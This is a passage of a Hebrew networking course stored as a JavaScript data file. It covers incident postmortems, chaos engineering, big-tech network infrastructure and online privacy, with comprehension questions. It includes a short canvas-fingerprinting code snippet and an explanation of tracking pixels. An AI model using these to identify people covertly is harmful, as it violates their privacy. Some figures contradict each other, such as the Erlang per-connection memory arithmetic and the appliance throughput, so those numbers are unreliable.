            <li><strong>Root Cause Analysis:</strong> 5 Why's — מחפשים את הסיבה העמוקה, לא הסימפטום</li>
            <li><strong>Impact:</strong> כמה משתמשים הושפעו, כמה הכנסות אבדו, SLA</li>
            <li><strong>Action Items:</strong> מה נשנה — תהליך, קוד, מוניטורינג</li>
            <li><strong>Prevention:</strong> איך למנוע הישנות</li>
          </ul>
          <div class="code-preview">
            <pre><code>Postmortem: Database Outage — 2024-03-15
Severity: P0 | Duration: 47 minutes
Impact: 2.3M users, $180K revenue loss

Timeline:
14:23 — Deploy of config change (auto-approved)
14:24 — Error rate spikes to 45%
14:31 — On-call paged
14:51 — Root cause found: missing index on new column
15:10 — Rollback deployed, recovery complete

Root Cause: config change added query without index review.
5 Why: Why no index? → wasn't in schema migration.
Why not? → code review checklist didn't include DB review.</code></pre>
          </div>
          <p><strong>Google SRE Book:</strong> "If a human operator needs to touch your system during normal operations, you have a bug."</p>
          <p>זה הסטנדרט שגוגל בנתה את אמינות שירותיה עליו.</p>
          <p><strong>Error Budget</strong> — <code>SLA</code> של 99.9% אומר שמותרות 8.7 שעות <code>downtime</code> לשנה.</p>
          <p>גוגל מתירה לעצמה לנצל את ה-<code>budget</code> הזה — כי ללא סיכון, אין חדשנות.</p>
        `
      },
      {
        type: "explanation",
        title: "Chaos Engineering – שוברים בכוונה",
        content: `
          <p><strong>Netflix, 2011:</strong> "מה יקרה אם שרת ייפול אקראי ב-<code>production</code>?"</p>
          <p>במקום לחשוב — הם ניסו. כך נולד <strong>Chaos Monkey</strong>.</p>
          <p><strong><code>Chaos Engineering</code></strong> = הזרקת כשלים מבוקרת למערכת חיה, כדי לגלות חולשות לפני שהמציאות מגלה אותן.</p>
          <ul>
            <li><strong>Chaos Monkey:</strong> מפיל instances אקראיים ב-AWS</li>
            <li><strong>Latency Monkey:</strong> מוסיף עיכובים אקראיים לבקשות</li>
            <li><strong>Chaos Gorilla:</strong> מפיל Availability Zone שלמה</li>
            <li><strong>Chaos Kong:</strong> מדמה נפילת Region שלם של AWS</li>
          </ul>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 360 100" class="content-diagram">
              <rect x="10" y="20" width="75" height="60" rx="6" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="47" y="48" text-anchor="middle" font-size="9">Service A</text>
              <text x="47" y="60" text-anchor="middle" font-size="8" fill="var(--text-muted)">healthy</text>
              <rect x="140" y="20" width="75" height="60" rx="6" fill="#fee2e2" stroke="#f87171"/>
              <text x="177" y="48" text-anchor="middle" font-size="9" fill="#dc2626">Service B</text>
              <text x="177" y="60" text-anchor="middle" font-size="8" fill="#dc2626">💀 killed</text>
              <rect x="270" y="20" width="75" height="60" rx="6" fill="#d1fae5" stroke="#34d399"/>
              <text x="307" y="44" text-anchor="middle" font-size="9" fill="#065f46">Service A</text>
              <text x="307" y="56" text-anchor="middle" font-size="8" fill="#065f46">fallback ✓</text>
              <text x="307" y="68" text-anchor="middle" font-size="8" fill="#065f46">cache used</text>
              <path d="M 87 50 L 138 50" stroke="var(--accent)" stroke-width="2" marker-end="url(#arrow)"/>
              <path d="M 217 50 L 268 50" stroke="#34d399" stroke-width="2" marker-end="url(#arrow)"/>
              <text x="180" y="95" text-anchor="middle" font-size="8" fill="var(--text-muted)">Chaos → כשל → fallback עובד = מערכת resilient</text>
            </svg>
          </div>
          <p><strong>עיקרון:</strong> <code>resilience</code> לא נבנית בתכנון — היא נבדקת בפועל.</p>
          <p>Netflix מריצה <code>Chaos Monkey</code> ב-<code>production</code> מדי יום. הם מוכנים לכשלים אמיתיים כי הם רגילים אליהם.</p>
          <p><strong>GameDay</strong> — פרקטיקה של Amazon.</p>
          <p>ביום קבוע בוחרים תרחיש כמו "Region נפל" ומתרגלים תגובה. כמו תרגיל אש, אבל למערכות מחשב.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – הלקחים הגדולים",
        intro: "<p>מה מלמדות הקריסות הגדולות על עיצוב מערכות?</p>",
        blocks: [
          {
            title: "בלי single point of failure",
            icon: "🔗",
            content: `<p>כל מערכת שיש בה רכיב אחד שנפילתו מפילה הכל — סובלת מ-<code>single point of failure</code>.</p>
              <p>פייסבוק הסתמכה על <code>BGP</code> אחיד ללא <code>fallback</code>. Amazon הריצה הכל ב-<code>us-east-1</code>.</p>
              <p><strong><code>Redundancy</code> היא לא תכונה — היא הישרדות.</strong> בניית מערכת שמוכנה לכשל של כל רכיב בה נקראת <code>chaos-by-design</code>.</p>`
          },
          {
            title: "הכשל היה בתהליך, לא בקוד",
            icon: "📋",
            content: `<p>ברוב הקריסות הגדולות — הקוד לא היה שגוי. ה-<code>patch</code> היה קיים. ה-<code>backup</code> היה שם.</p>
              <p>מה שנכשל היה ה<strong>תהליך</strong>:</p>
              <ul>
                <li><code>deploy</code> ללא <code>peer review</code></li>
                <li><code>config change</code> ללא <code>rollback plan</code></li>
                <li><code>on-call</code> שלא קיבל התראה</li>
              </ul>
              <p>ההשקעה ב-<code>incident response</code>, <code>runbooks</code>, ואוטומציה של <code>deployments</code> שווה יותר מ-1,000 שורות קוד.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 23",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>BGP</code> = פרוטוקול "מפת האינטרנט". ביטול <code>prefix</code> → נעלמת מהרשת. אין <code>authentication</code> מובנה</li>
              <li><code>SQL Slammer</code> (2003): 376 בתים, 10 דקות, 75K שרתים נגועים. <code>Patch</code> היה קיים. לא עודכנו</li>
              <li><code>BGP Leaks</code>: כל <code>AS</code> יכול להכריז על כל <code>prefix</code>. <code>RPKI</code> = פתרון קריפטוגרפי חלקי</li>
              <li><code>Postmortem</code>: <code>blameless</code>, <code>timeline</code>, 5 Why's, action items. לא עונשים — לומדים</li>
              <li><code>Chaos Engineering</code>: מזריקים כשלים בכוונה לגלות חולשות. <code>Netflix</code> <code>Chaos Monkey</code> ב-<code>production</code> יומיומי</li>
              <li>לקח עמוק: <code>single point of failure</code> = בעיה. <code>redundancy</code> + <code>runbooks</code> + testing = survival</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 23",
        titleEn: "Chapter 23 — Comprehension Questions",
        questions: [
          {
            q: "למה כשפייסבוק ביטלה את ה-BGP announcements שלה, עובדיה לא יכלו להתחבר מרחוק לתקן?",
            a: "כלי הניהול והגישה מרחוק של פייסבוק (SSH, VPN, כלי ניטור) כולם מתחברים לשרתי פייסבוק. כשפייסבוק הסירה את עצמה מהאינטרנט — גם הגישה הפנימית מרחוק נפלה. המהנדסים נאלצו לנסוע פיזית.",
            qEn: "Why could Facebook employees not connect remotely to fix the issue when BGP announcements were withdrawn?",
            aEn: "Facebook's remote management tools (SSH, VPN, monitoring) all connect to Facebook's servers. When Facebook removed itself from the Internet, internal remote access also went down. Engineers had to physically drive to the data center."
          },
          {
            q: "מה ההבדל בין BGP Leak ל-BGP Hijacking?",
            a: "BGP Leak = טעות לא מכוונת — AS מפיץ routing שהיה צריך להישאר פנימי. BGP Hijacking = פעולה זדונית — AS מכריז על prefix שאינו שלו כדי לנתב תנועה דרכו.",
            qEn: "What is the difference between a BGP Leak and BGP Hijacking?",
            aEn: "BGP Leak is an unintentional mistake — an AS spreads routing info that should have stayed internal. BGP Hijacking is a malicious action — an AS announces a prefix that is not its own to route traffic through itself."
          },
          {
            q: "מה עיקרון ה-'blameless postmortem' ולמה הוא חשוב?",
            a: "לא מחפשים מי אשם אלא מה גרם לכשל. כשאנשים לא מפחדים מעונש — הם מדווחים בפתיחות, הפוסטמורטם מדויק יותר, הלמידה עמוקה יותר. תרבות של אשמה מביאה להסתרת מידע.",
            qEn: "What is the 'blameless postmortem' principle and why is it important?",
            aEn: "Instead of looking for who is to blame, you look for what caused the failure. When people are not afraid of punishment, they report openly, the postmortem is more accurate, and learning is deeper. A blame culture leads to hiding information."
          }
        ]
      }
    ]
  },
  {
    id: 24,
    title: "מאחורי הקלעים – הרשתות של הענקיות",
    pages: [
      {
        type: "explanation",
        title: "Netflix Open Connect – CDN בתוך ה-ISP",
        content: `
          <p>Netflix אחראית על ~15% מתנועת האינטרנט בעולם בשעות הערב.</p>
          <p><strong>שאלה:</strong> איך הם עושים את זה בלי לשלם מיליארדים על <code>bandwidth</code>?</p>
          <p><strong>Open Connect Appliance (<code>OCA</code>)</strong> — Netflix בנתה שרתי <code>cache</code> מיוחדים ומציעה אותם בחינם לספקיות אינטרנט.</p>
          <p>ה-<code>ISP</code> מקבל <code>hardware</code> בחינם. Netflix חוסכת עלויות <code>bandwidth</code>. שני הצדדים מרוויחים.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 360 120" class="content-diagram">
              <rect x="10" y="40" width="80" height="40" rx="4" fill="#fee2e2" stroke="#f87171"/>
              <text x="50" y="57" text-anchor="middle" font-size="9">Netflix Origin</text>
              <text x="50" y="69" text-anchor="middle" font-size="8" fill="var(--text-muted)">AWS + נתוני וידאו</text>
              <rect x="140" y="20" width="80" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="180" y="37" text-anchor="middle" font-size="9">OCA בISP</text>
              <text x="180" y="49" text-anchor="middle" font-size="8" fill="var(--text-muted)">Stranger Things 4K</text>
              <rect x="140" y="65" width="80" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="180" y="82" text-anchor="middle" font-size="9">OCA בISP אחר</text>
              <text x="180" y="94" text-anchor="middle" font-size="8" fill="var(--text-muted)">The Crown 4K</text>
              <rect x="280" y="40" width="70" height="40" rx="4" fill="#d1fae5" stroke="#34d399"/>
              <text x="315" y="57" text-anchor="middle" font-size="9" fill="#065f46">משתמשים</text>
              <text x="315" y="69" text-anchor="middle" font-size="8" fill="#065f46">≤5ms RTT</text>
              <line x1="90" y1="60" x2="138" y2="37" stroke="var(--text-muted)" stroke-width="1.5" stroke-dasharray="4,2"/>
              <line x1="90" y1="60" x2="138" y2="82" stroke="var(--text-muted)" stroke-width="1.5" stroke-dasharray="4,2"/>
              <line x1="220" y1="37" x2="278" y2="57" stroke="#34d399" stroke-width="2"/>
              <line x1="220" y1="82" x2="278" y2="62" stroke="#34d399" stroke-width="2"/>
              <text x="180" y="115" text-anchor="middle" font-size="8" fill="var(--text-muted)">הvideo מגיע מה-ISP עצמו, לא מ-AWS</text>
            </svg>
          </div>
          <p><strong>מה ה-<code>OCA</code> שומר?</strong></p>
          <p>Netflix יודעת מה פופולרי באזור כל <code>ISP</code>.</p>
          <p>בלילה, היא מעבירה מראש ל-<code>OCA</code> את הסדרות הפופולריות — למחרת הכל ב-<code>cache</code> מקומי.</p>
          <p><strong>טכנולוגית:</strong> כל <code>OCA</code> מורכב מ:</p>
          <ul>
            <li><code>FreeBSD</code> + <code>nginx</code> מותאם + כוננים <code>NVMe</code></li>
            <li>נפח אחסון: 100-250TB</li>
            <li>רוחב פס: עד 300Gbps לכל יחידה</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "WhatsApp – מיליארד משתמשים עם 50 מהנדסים",
        content: `
          <p><strong>2014:</strong> WhatsApp נמכרת לפייסבוק ב-$19 מיליארד.</p>
          <p>450 מיליון משתמשים פעילים. <strong>55 עובדים בסך הכל.</strong></p>
          <p><strong>איך?</strong> ארכיטקטורה שמינימליזציה היא עיקרה:</p>
          <ul>
            <li><strong><code>Erlang/OTP</code>:</strong> שפת תכנות שנבנתה ל-<code>telecom</code>, לניהול מיליוני חיבורים קונקורנטיים. כל חיבור הוא <code>process</code> קל משקל, ולא <code>thread</code> של מערכת ההפעלה</li>
            <li><strong>Single responsibility:</strong> WhatsApp לא עשתה stories, games או payments. <strong>רק הודעות</strong>. פחות פיצ'רים, פחות באגים, צוות קטן</li>
            <li><strong><code>XMPP</code> מותאם:</strong> פרוטוקול מבוסס <code>XML</code> להודעות מיידיות, ש-WhatsApp הסבה לפורמט <code>binary</code> — קטן פי 10</li>
          </ul>
          <div class="code-preview">
            <pre><code># ארכיטקטורת WhatsApp בצורה פשוטה:
Client → (TCP long-lived connection) → WhatsApp Server
Server: Erlang process per connection (~2MB RAM each)
2M connections × 2MB = 4GB RAM (!) בלבד
vs. Python/Java thread: 8-512MB per thread

1,000,000 concurrent users:
  Erlang: ~2GB RAM, 1 server
  Java threads: ~500GB RAM, 100 servers</code></pre>
          </div>
          <p><strong>פרוטוקול פשוט = סקייל גדול.</strong></p>
          <p>כל הודעה מכילה מזהה ייחודי, <code>timestamp</code>, נמען, ותוכן.</p>
          <p>השרת לא שומר הודעות — רק מנתב.</p>
          <p>ברגע שההודעה התקבלה, היא נמחקת. גישה זו משרתת גם פרטיות וגם יכולת הרחבה.</p>
          <p><strong>הלקח:</strong> בחירת טכנולוגיה נכונה לבעיה הנכונה שווה יותר ממאה מהנדסים נוספים.</p>
        `
      },
      {
        type: "explanation",
        title: "Google B4 – הרשת הפרטית של גוגל",
        content: `
          <p>גוגל לא סומכת על האינטרנט הציבורי לתנועה הפנימית שלה.</p>
          <p>ב-2013 פרסמה גוגל על <strong>B4</strong> — רשת <code>WAN</code> פרטית שמחברת את כל מרכזי הנתונים שלה.</p>
          <p><strong>הסיבה:</strong> האינטרנט הציבורי מבוסס על <code>BGP</code>, שבוחר מסלול קצר — לא בהכרח את המסלול עם הכי פחות עומס.</p>
          <p>לגוגל, שמעבירה פטהבייטים ביום בין מרכזי נתונים, ניתוב כזה לא מספיק טוב.</p>
          <p><strong>B4 = <code>Software-Defined WAN</code>:</strong></p>
          <ul>
            <li>כל ה-<code>hardware</code> מנוהל על ידי תוכנה מרכזית — <strong><code>OpenFlow controller</code></strong></li>
            <li>ניתוב מבוסס אופטימיזציה בזמן אמת — <code>Traffic Engineering</code></li>
            <li>ניצולת רוחב פס: כ-100%, לעומת 30-40% ברשתות רגילות</li>
            <li>גוגל בנתה <code>hardware</code> משלה — <code>Pluto switches</code> — במקום Cisco או Juniper</li>
          </ul>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 360 110" class="content-diagram">
              <rect x="20" y="20" width="65" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="52" y="41" text-anchor="middle" font-size="9">DC אמריקה</text>
              <rect x="145" y="10" width="65" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="177" y="31" text-anchor="middle" font-size="9">DC אירופה</text>
              <rect x="270" y="20" width="65" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="302" y="41" text-anchor="middle" font-size="9">DC אסיה</text>
              <rect x="145" y="70" width="65" height="30" rx="4" fill="#3b82f6" stroke="#1d4ed8"/>
              <text x="177" y="86" text-anchor="middle" font-size="9" fill="white">SDN Controller</text>
              <line x1="85" y1="37" x2="143" y2="27" stroke="#0891b2" stroke-width="2"/>
              <line x1="210" y1="27" x2="268" y2="37" stroke="#0891b2" stroke-width="2"/>
              <line x1="177" y1="55" x2="177" y2="68" stroke="#3b82f6" stroke-width="2" stroke-dasharray="4,2"/>
              <line x1="52" y1="55" x2="177" y2="70" stroke="#3b82f6" stroke-width="1.5" stroke-dasharray="4,2"/>
              <line x1="302" y1="55" x2="177" y2="70" stroke="#3b82f6" stroke-width="1.5" stroke-dasharray="4,2"/>
              <text x="177" y="108" text-anchor="middle" font-size="8" fill="var(--text-muted)">controller מחליט ניתוב בזמן אמת לפי עומסים</text>
            </svg>
          </div>
          <p><strong>מה גוגל הרוויחה:</strong></p>
          <ul>
            <li>חיסכון של מעל מיליארד דולר בשנה על <code>bandwidth</code> חיצוני</li>
            <li>ביצועי <code>latency</code> עדיפים</li>
            <li>שליטה מוחלטת על מסלולי הנתונים שלה</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "כבלי הים – עמוד השדרה הנסתר של האינטרנט",
        content: `
          <p>כ-99% מהתנועה הבינלאומית עוברת דרך <strong>כבלי תת-ים</strong>.</p>
          <p>לא לוויינים — כבלים.</p>
          <p>מעל 400 כבלים, 1.2 מיליון ק"מ, בקרקעית האוקיינוס.</p>
          <p><strong>מה בתוך הכבל?</strong></p>
          <ul>
            <li><code>Fiber optic</code> — בדרך כלל 8-16 זוגות סיבים</li>
            <li>כל סיב מכיל מספר ערוצי אור בטכנולוגיית <code>DWDM</code></li>
            <li>כבל מודרני מעביר מעל 400 Tbps</li>
            <li>מחזיק מעמד 25 שנה בלחץ אוקיאני, טמפרטורה קרה ומלח</li>
          </ul>
          <p><strong>מי מחזיק את הכבלים?</strong></p>
          <p>עד לפני 10 שנים — קונסורציומים של טלקומים. היום — גוגל, פייסבוק ו-Amazon בנו כבלים פרטיים:</p>
          <ul>
            <li><strong>Dunant</strong> (Google) — US-France, 250Tbps</li>
            <li><strong>2Africa</strong> (Meta) — מקיף את אפריקה, 180Tbps</li>
            <li><strong>MAREA</strong> (Microsoft+Facebook) — US-Spain, 160Tbps</li>
          </ul>
          <p><strong>סכנות:</strong> עוגנים של ספינות גורמים ל-70% מהנזקים.</p>
          <p>ב-2008, עוגן אחד בים התיכון חתך 3 כבלים.</p>
          <p>75 מיליון אנשים באפריקה ואסיה נותרו ללא אינטרנט.</p>
          <p>ספינות תיקון ייעודיות ממתינות 24/7 לאירועים כאלה.</p>
        `
      },
      {
        type: "explanation",
        title: "Cloudflare – 300 ערים, אותה כתובת IP",
        content: `
          <p>Cloudflare מגינה על כ-20% מאתרי האינטרנט.</p>
          <p>300 נקודות נוכחות, כמיליארד כתובות <code>IP</code> בניהולה.</p>
          <p>עיקרון ההנדסה המרכזי: <strong><code>Anycast</code></strong>.</p>
          <p><strong>מה זה <code>Anycast</code>?</strong></p>
          <p>אותה כתובת <code>IP</code> מוכרזת ממאות מקומות שונים. <code>BGP</code> מנתב כל משתמש לנקודה הקרובה ביותר — אוטומטית.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 360 110" class="content-diagram">
              <circle cx="180" cy="55" r="20" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-dasharray="4,2"/>
              <text x="180" y="52" text-anchor="middle" font-size="8" fill="var(--accent)">1.1.1.1</text>
              <text x="180" y="63" text-anchor="middle" font-size="7" fill="var(--text-muted)">Anycast</text>
              <circle cx="50" cy="20" r="12" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="50" y="24" text-anchor="middle" font-size="7">NY PoP</text>
              <circle cx="310" cy="20" r="12" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="310" y="24" text-anchor="middle" font-size="7">TLV PoP</text>
              <circle cx="50" cy="90" r="12" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="50" y="94" text-anchor="middle" font-size="7">LON PoP</text>
              <circle cx="310" cy="90" r="12" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="310" y="94" text-anchor="middle" font-size="7">TKY PoP</text>
              <line x1="62" y1="26" x2="160" y2="46" stroke="var(--accent)" stroke-width="1.5"/>
              <line x1="298" y1="26" x2="200" y2="46" stroke="var(--accent)" stroke-width="1.5"/>
              <line x1="62" y1="84" x2="160" y2="64" stroke="var(--accent)" stroke-width="1.5"/>
              <line x1="298" y1="84" x2="200" y2="64" stroke="var(--accent)" stroke-width="1.5"/>
              <text x="180" y="105" text-anchor="middle" font-size="8" fill="var(--text-muted)">BGP מנתב כל משתמש ל-PoP הקרוב — אוטומטי</text>
            </svg>
          </div>
          <p><strong><code>DDoS mitigation</code></strong> — ב-2024 ספגה Cloudflare מתקפת <code>DDoS</code> של 5.6 Tbps, הגדולה שתועדה.</p>
          <p>התנועה מחולקת ל-300 נקודות <code>PoP</code>. כל נקודה סופגת רק שבריר מהעומס.</p>
          <p>לאחר סינון מקומי, רק תנועה נקייה עוברת ל-<code>origin</code>.</p>
          <p><strong><code>Workers</code></strong> — Cloudflare מאפשרת להריץ <code>JavaScript</code> ו-<code>WASM</code> ב-300 מקומות בו-זמנית.</p>
          <p>זה <code>Edge Computing</code> — הקוד רץ ליד המשתמש, לא במרכז נתונים רחוק.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – הרשת כמוצר",
        intro: "<p>כמה תובנות על הכוח, הכלכלה, והגיאופוליטיקה של רשתות:</p>",
        blocks: [
          {
            title: "מי שולט בכבלים — שולט בתוכן",
            icon: "🌊",
            content: `<p>כש-Huawei הציעה לבנות כבלי ים לאפריקה במחיר הזול מהשוק, ממשלות מערביות חסמו את העסקה.</p>
              <p>הסיבה: <strong>מי שבנה את הכבל, יכול לנטר את התנועה עליו</strong>. ה-<code>NSA</code> כבר עשתה זאת על כבלים אמריקניים, כפי שנחשף בפרטות של Snowden.</p>
              <p>הרשת הפיזית היא פוליטיקה.</p>`
          },
          {
            title: "ספקיות הענן ממציאות את הרשת מחדש",
            icon: "☁️",
            content: `<p>Google, AWS ו-Azure בנו רשתות שמגיעות לביצועים שחברות טלקום לא הצליחו להשיג.</p>
              <p><code>BGP</code> הוא עדיין פרוטוקול שנוצר ב-1989 "על מפיות בארוחת ערב".</p>
              <p><code>QUIC</code>, <code>HTTP/3</code>, <code>SD-WAN</code>, <code>eBPF</code> — הטכנולוגיות שמחליפות את הרשת הישנה נולדות בחברות הטכנולוגיה, לא רק ב-<code>IETF</code>.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 24",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>Netflix Open Connect</code>: <code>OCA</code> ב-<code>ISPs</code> — טעינת ה-<code>cache</code> מראש מתרחשת לפני הצפייה. ~100Gbps per appliance</li>
              <li><code>WhatsApp</code>: <code>Erlang</code> = מיליון חיבורים קונקורנטיים ב-2GB <code>RAM</code>. פחות פיצ'רים = scale גדול</li>
              <li><code>Google B4</code>: <code>SD-WAN</code> פרטי, <code>OpenFlow controller</code>, 100% <code>bandwidth utilization</code>, <code>hardware</code> מותאם</li>
              <li>כבלי ים: 99% מהתנועה הבינלאומית. <code>Google</code>/<code>Meta</code>/<code>Microsoft</code> בנו כבלים פרטיים</li>
              <li><code>Cloudflare Anycast</code>: אותה <code>IP</code> ב-300 <code>PoPs</code>. <code>BGP</code> = ניתוב אוטומטי לקרוב ביותר. 5.6 Tbps <code>DDoS</code> ספוג</li>
              <li>רשת = כוח גיאופוליטי. מי בונה = מי מנטר</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 24",
        titleEn: "Chapter 24 — Comprehension Questions",
        questions: [
          {
            q: "מה ה-Open Connect Appliance של Netflix ואיזה יתרון הוא נותן ל-ISP?",
            a: "OCA = שרת cache ש-Netflix מספקת ל-ISPs בחינם. ה-ISP מקבל hardware ללא עלות, ותנועת הvideo לא יוצאת מהרשת שלו (חוסך bandwidth יקר). Netflix חוסכת עלויות transit עצומות. Win-win.",
            qEn: "What is Netflix's Open Connect Appliance and what advantage does it give the ISP?",
            aEn: "OCA is a cache server that Netflix provides to ISPs for free. The ISP gets hardware at no cost, and video traffic stays inside its own network (saving expensive bandwidth). Netflix saves huge transit costs. Win-win."
          },
          {
            q: "למה WhatsApp בחרה ב-Erlang ולא ב-Python או Java?",
            a: "Erlang/OTP נבנתה ל-telecom — ניהול מיליוני חיבורים קונקורנטיים. כל חיבור הוא process קל (ולא thread OS כבד). ב-Erlang: מיליון חיבורים ≈ 2GB RAM. ב-Java threads: עשרות GB. הבחירה הארכיטקטונית אפשרה צוות קטן לנהל scale ענק.",
            qEn: "Why did WhatsApp choose Erlang instead of Python or Java?",
            aEn: "Erlang/OTP was built for telecom — managing millions of concurrent connections. Each connection is a lightweight process (not a heavy OS thread). In Erlang: one million connections use about 2GB RAM. With Java threads: tens of GB. This architecture choice let a small team handle huge scale."
          },
          {
            q: "מה Anycast ואיך Cloudflare משתמשת בו להגנה מ-DDoS?",
            a: "Anycast = אותה כתובת IP מוכרזת ממאות מקומות. BGP מנתב כל משתמש לנקודה הקרובה. ב-DDoS: התנועה מחולקת ל-300 PoPs — כל PoP ספג שבריר. לאחר filtering מקומי, רק תנועה נקייה עוברת לorigin. Scale ו-distribution = resilience.",
            qEn: "What is Anycast and how does Cloudflare use it for DDoS protection?",
            aEn: "Anycast means the same IP address is announced from hundreds of locations. BGP routes each user to the nearest point. During DDoS: traffic is split across 300 PoPs — each PoP absorbs a fraction. After local filtering, only clean traffic passes to the origin. Scale and distribution equals resilience."
          }
        ]
      }
    ]
  },
  {
    id: 25,
    title: "פרטיות ומעקב – מה באמת רואים עלייך",
    pages: [
      {
        type: "explanation",
        title: "מה ה-ISP שלך רואה",
        content: `
          <p>ספקית האינטרנט שלך רואה כל <code>DNS query</code> שלך — גם אחרי שעברת ל-<code>HTTPS</code>.</p>
          <p><strong>מדוע?</strong></p>
          <ul>
            <li><code>HTTPS</code> מצפין <em>תוכן</em> — לא את שם הדומיין</li>
            <li>שאילתת <code>DNS</code> — למשל "מה ה-IP של pornhub.com?" — נשלחת ב-<code>plain text</code> לשרת <code>DNS</code>, בדרך כלל של ספקית האינטרנט, ללא הצפנה</li>
            <li><code>TLS SNI</code> — Server Name Indication: בחיבור <code>HTTPS</code>, שם הדומיין נשלח בטקסט גלוי כחלק מה-<code>TLS Handshake</code> הראשוני</li>
          </ul>
          <div class="code-preview">
            <pre><code># מה ISP רואה כשאת גולשת ל-gmail.com:
DNS Query:  "מה ה-IP של gmail.com?" [גלוי]
TLS SNI:    "מתחברת ל: gmail.com" [גלוי]
IP address: 142.250.80.101 [גלוי]
תוכן:       ENCRYPTED [מוצפן]

# Timeline עם timestamps:
08:23:41  DNS query → gmail.com
08:23:41  TLS → gmail.com:443
08:24:05  DNS query → youtube.com
09:17:33  DNS query → bankofamerica.com</code></pre>
          </div>
          <p><strong>מה ה-ISP יכול לעשות עם זה:</strong></p>
          <p>בארה"ב, מאז 2017, ספקיות אינטרנט רשאיות למכור את נתוני הגלישה שלך.</p>
          <p>בין הלקוחות הפוטנציאליים: חברות ביטוח, מעסיקים, וסוכנויות פרסום.</p>
          <p><strong>הגנות:</strong></p>
          <ul>
            <li><code>DoH</code> — DNS over HTTPS: מצפין את שאילתות ה-<code>DNS</code></li>
            <li><code>ECH</code> — Encrypted Client Hello: גרסת <code>TLS 1.3</code> שמסתירה גם את ה-<code>SNI</code></li>
            <li><code>VPN</code> — מנתב את כל התנועה דרך מנהרה מוצפנת</li>
          </ul>
          <p>אף כלי לבדו לא מספיק — נדרש שילוב של כולם.</p>
        `
      },
      {
        type: "explanation",
        title: "Browser Fingerprinting – זיהוי ללא Cookies",
        content: `
          <p>חשבת ש-<code>Incognito</code> מגן עלייך?</p>
          <p><code>Browser Fingerprinting</code> לא צריך <code>cookies</code>.</p>
          <p>הוא מזהה אותך לפי המאפיינים הטכניים של הדפדפן שלך.</p>
          <p><strong>מה נאסף ליצירת הזיהוי:</strong></p>
          <ul>
            <li><strong>User-Agent:</strong> Chrome 124 / Windows 11 / Intel</li>
            <li><strong>Fonts מותקנים:</strong> האם יש Arial, Times New Roman, Calibri + 200 נוספות?</li>
            <li><strong><code>Canvas fingerprint</code>:</strong> הדפדפן מצייר טקסט — עיבוד הפיקסלים שונה בכל <code>GPU</code> ומערכת הפעלה</li>
            <li><strong><code>WebGL renderer</code>:</strong> חושף את שם הכרטיס הגרפי, למשל NVIDIA GeForce RTX 3070</li>
            <li><strong>רזולוציית מסך, עומק צבע ואזור זמן</strong></li>
            <li><strong><code>Audio context</code>:</strong> אופן עיבוד האודיו ייחודי לחומרה שלך</li>
          </ul>
          <div class="code-preview">
            <pre><code>// Canvas fingerprinting — איך זה עובד:
const canvas = document.createElement('canvas')
const ctx = canvas.getContext('2d')
ctx.font = '18px Arial'
ctx.fillText('Hello, World! 🌍', 10, 50)
// כל GPU/OS מצייר פיקסלים שונים מעט
const fingerprint = canvas.toDataURL()
// → hash ייחודי ≈ 99% ייחודיות</code></pre>
          </div>
          <p><strong>הנתון המבהיל:</strong> מחקר <code>Panopticlick</code> של EFF מצא שצירוף הפרמטרים ייחודי לכ-1 מתוך 286,777 דפדפנים.</p>
          <p>כלומר — כמעט בלתי אפשרי לטעות בזיהוי.</p>
          <p><strong>הגנה:</strong></p>
          <ul>
            <li><code>Tor Browser</code> מבצע אקראיזציה של טביעת האצבע</li>
            <li><code>Firefox</code> מציע מצב <code>Resist Fingerprinting</code></li>
            <li>בלי הגנה אקטיבית — קשה מאוד להתחמק</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "כיצד Google ו-Meta עוקבות עלייך",
        content: `
          <p>כשאת גולשת לאתר שכולל <code>Facebook Like Button</code> או <code>Google Analytics</code> — Google ו-Meta יודעות שביקרת שם.</p>
          <p>זה קורה גם אם לא לחצת על כלום.</p>
          <p><strong>Third-party tracking pixel — כיצד עובד:</strong></p>
          <ol>
            <li>אתר X מכיל <code>&lt;img src="https://facebook.com/pixel?id=123"&gt;</code></li>
            <li>הדפדפן שלך שולח request ל-facebook.com</li>
            <li>Facebook מקבלת: כתובת IP שלך, Referer (= אתר X), timestamp, cookies של Facebook שלך</li>
            <li>Facebook יודעת: היית באתר X בשעה Z</li>
          </ol>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 360 100" class="content-diagram">
              <rect x="10" y="20" width="70" height="55" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="42" text-anchor="middle" font-size="9">הדפדפן שלך</text>
              <text x="45" y="57" text-anchor="middle" font-size="8" fill="var(--text-muted)">cookie: fb_uid=X</text>
              <rect x="140" y="30" width="75" height="35" rx="4" fill="#f0f9ff" stroke="#0ea5e9"/>
              <text x="177" y="47" text-anchor="middle" font-size="9">אתר חדשות</text>
